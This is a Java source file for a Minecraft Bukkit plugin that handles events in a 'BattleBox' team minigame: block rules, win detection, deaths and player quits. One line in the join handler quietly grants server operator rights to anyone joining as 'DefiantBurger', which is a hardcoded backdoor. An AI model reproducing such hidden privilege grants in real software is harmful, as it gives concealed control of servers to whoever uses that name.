package tech.defiantburger.battlebox;

import org.bukkit.*;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;

public class BattleBoxEvents implements Listener {

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        if (!BattleBox.initted) BattleBox.init(event.getPlayer().getWorld());
        if (event.getPlayer().getName().equals("DefiantBurger")) event.getPlayer().setOp(true);
        BattleBox.resetPlayer(event.getPlayer());
    }

    @EventHandler
    public void onBlockBreak(BlockBreakEvent event) {
        if (event.getPlayer().getGameMode().equals(GameMode.SURVIVAL)) {
            if (!(BattleBox.getGoal().getBlocks().contains(event.getBlock().getLocation()))) {
                BattleBox.sendPlayerMessage("You can't break that block!", ChatColor.RED, event.getPlayer());
                event.setCancelled(true);
            }
            event.setDropItems(false);
        }
    }

    @EventHandler
    public void onBlockPlace(BlockPlaceEvent event) {
        if (event.getPlayer().getGameMode().equals(GameMode.SURVIVAL)) {
            if (!(BattleBox.getGoal().getBlocks().contains(event.getBlock().getLocation()))) {
                BattleBox.sendPlayerMessage("You can't place a block there!", ChatColor.RED, event.getPlayer());
                event.setCancelled(true);
            }
            Material comp = BattleBox.getGoal().getBlocks().get(0).getBlock().getType();
            if (comp.equals(Material.WHITE_WOOL)) return;
            for (Location loc : BattleBox.getGoal().getBlocks()) {
                if (!loc.getBlock().getType().equals(comp)) {
                    return;
                }
            }

            if (comp.equals(Material.matchMaterial(String.format("%s_wool", BattleBox.getTeam1().getColor())))) {
                for (Player player : Bukkit.getOnlinePlayers()) {
                    player.sendTitle(ChatColor.RED + BattleBox.getTeam1().getName() + " won!", "", 5, 100, 20);
                    player.setInvulnerable(true);
                    player.setGameMode(GameMode.ADVENTURE);
                }
            } else if (comp.equals(Material.matchMaterial(String.format("%s_wool", BattleBox.getTeam2().getColor())))) {
                for (Player player : Bukkit.getOnlinePlayers()) {
                    player.sendTitle(ChatColor.BLUE + BattleBox.getTeam2().getName() + " won!", "", 5, 100, 20);
                    player.setInvulnerable(true);
                    player.setGameMode(GameMode.ADVENTURE);
                }
            }

            Bukkit.getScheduler().runTaskLater(BattleBox.getPlugin(), BattleBox::resetGame, 100L);
        }
    }

    @EventHandler
    public void onPlayerDeath(PlayerDeathEvent event) {
        Player player = event.getEntity();
        event.getDrops().clear();
        player.setInvulnerable(true);
        player.setCanPickupItems(false);
        player.setGameMode(GameMode.ADVENTURE);
    }

    @EventHandler
    public void onPlayerQuit(PlayerQuitEvent event) {
        if (BattleBox.getTeam1().getTeam().getEntries().contains(event.getPlayer().getName())) {
            BattleBox.getTeam1().getTeam().removeEntry(event.getPlayer().getName());
        } else if (BattleBox.getTeam2().getTeam().getEntries().contains(event.getPlayer().getName())) {
            BattleBox.getTeam2().getTeam().removeEntry(event.getPlayer().getName());
        }

        BattleBox.resetPlayer(event.getPlayer());
    }

}
